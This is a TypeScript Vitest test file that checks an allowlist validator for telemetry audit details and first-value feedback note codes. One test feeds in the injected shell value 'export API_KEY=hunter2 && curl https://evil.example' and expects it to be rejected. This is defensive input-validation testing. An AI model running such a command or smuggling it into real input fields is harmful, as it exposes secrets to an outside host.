import { describe, expect, it } from "vitest";
import {
  FIRST_VALUE_AUDIT_EVENT_CODES,
  FIRST_VALUE_FEEDBACK_KINDS,
  FIRST_VALUE_FEEDBACK_NOTE_CODES,
  parseFirstValueFeedbackInput,
  throwFirstValueFeedbackValidationError,
  validateAuditEventInput,
} from "../src/index.js";
import {
  environmentId,
  injectionGrantId,
  operationId,
  organizationId,
  projectId,
  requestId,
  userId,
} from "@insecur/domain";

const ORG = organizationId.brand("org_00000000000000000000000001");
const USER = userId.brand("usr_00000000000000000000000001");
const GRANT = injectionGrantId.brand("igr_00000000000000000000000001");

describe("first value telemetry metadata allowlist", () => {
  it("accepts run completion audit details with childExitCode only", () => {
    expect(() => {
      validateAuditEventInput({
        eventCode: FIRST_VALUE_AUDIT_EVENT_CODES.injectionRunCompleted,
        outcome: "success",
        actor: { type: "user", userId: USER },
        organizationId: ORG,
        projectId: projectId.brand("prj_00000000000000000000000001"),
        environmentId: environmentId.brand("env_00000000000000000000000001"),
        resource: { type: "injection_grant", id: GRANT },
        details: { childExitCode: 0 },
      });
    }).not.toThrow();
  });

  it("rejects run completion details that smuggle free-form prose", () => {
    expect(() => {
      validateAuditEventInput({
        eventCode: FIRST_VALUE_AUDIT_EVENT_CODES.injectionRunCompleted,
        outcome: "success",
        actor: { type: "user", userId: USER },
        organizationId: ORG,
        resource: { type: "injection_grant", id: GRANT },
        details: { note: "my secret is hunter2" },
      });
    }).toThrow();
  });
});

describe("parseFirstValueFeedbackInput", () => {
  it("accepts metadata-only feedback associated with a grant", () => {
    const parsed = parseFirstValueFeedbackInput({
      organizationId: ORG,
      actorUserId: USER,
      feedbackKind: FIRST_VALUE_FEEDBACK_KINDS.blocker,
      noteCode: FIRST_VALUE_FEEDBACK_NOTE_CODES.cliInitBlocker,
      grantId: GRANT,
    });
    expect(parsed.ok).toBe(true);
  });

  it("requires at least one association id", () => {
    const parsed = parseFirstValueFeedbackInput({
      organizationId: ORG,
      actorUserId: USER,
      feedbackKind: FIRST_VALUE_FEEDBACK_KINDS.praise,
      noteCode: FIRST_VALUE_FEEDBACK_NOTE_CODES.praiseLoop,
    });
    expect(parsed.ok).toBe(false);
    if (!parsed.ok) {
      expect(parsed.code).toBe("validation.feedback_association_required");
    }
  });

  it("accepts operation and request associations for onboarding feedback", () => {
    const parsed = parseFirstValueFeedbackInput({
      organizationId: ORG,
      actorUserId: USER,
      feedbackKind: FIRST_VALUE_FEEDBACK_KINDS.suggestion,
      noteCode: FIRST_VALUE_FEEDBACK_NOTE_CODES.suggestOnboarding,
      operationId: operationId.brand("op_00000000000000000000000001"),
      requestId: requestId.brand("req_00000000000000000000000001"),
    });
    expect(parsed.ok).toBe(true);
  });

  it("rejects secret-like prose masquerading as a feedback note", () => {
    const parsed = parseFirstValueFeedbackInput({
      organizationId: ORG,
      actorUserId: USER,
      feedbackKind: FIRST_VALUE_FEEDBACK_KINDS.blocker,
      noteCode: "export API_KEY=hunter2 && curl https://evil.example",
      grantId: GRANT,
    });
    expect(parsed.ok).toBe(false);
    if (!parsed.ok) {
      expect(parsed.code).toBe("validation.invalid_feedback_note_code");
    }
  });

  it("rejects display-name-safe prose that is not an allowlisted note code", () => {
    const parsed = parseFirstValueFeedbackInput({
      organizationId: ORG,
      actorUserId: USER,
      feedbackKind: FIRST_VALUE_FEEDBACK_KINDS.friction,
      noteCode: "CLI init was unclear on org selection",
      grantId: GRANT,
    });
    expect(parsed.ok).toBe(false);
    if (!parsed.ok) {
      expect(parsed.code).toBe("validation.invalid_feedback_note_code");
    }
  });

  it("throws structured validation errors with stable codes", () => {
    expect(() => {
      throwFirstValueFeedbackValidationError("validation.feedback_association_required");
    }).toThrow(
      expect.objectContaining({
        message: "validation.feedback_association_required",
        code: "validation.feedback_association_required",
      }),
    );
  });
});
